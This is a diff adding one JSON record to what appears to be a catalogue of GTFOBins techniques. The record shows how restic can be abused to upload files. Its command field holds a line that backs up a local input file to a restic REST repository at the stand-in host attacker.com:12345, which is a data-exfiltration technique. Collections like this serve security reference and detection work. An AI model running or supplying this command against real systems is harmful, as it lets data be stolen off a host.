@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-restic-upload",
+  "name": "GTFOBins · restic (upload)",
+  "command": "restic backup -r rest:http://attacker.com:12345/x /path/to/input-file",
+  "description": "Use restic to upload via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "restic",
+    "upload"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/restic/#upload",
+  "upstream_id": "restic/upload/0",
+  "category": "gtfobins",
+  "subcategory": "file-upload",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/restic/"
+    }
+  ]
+}
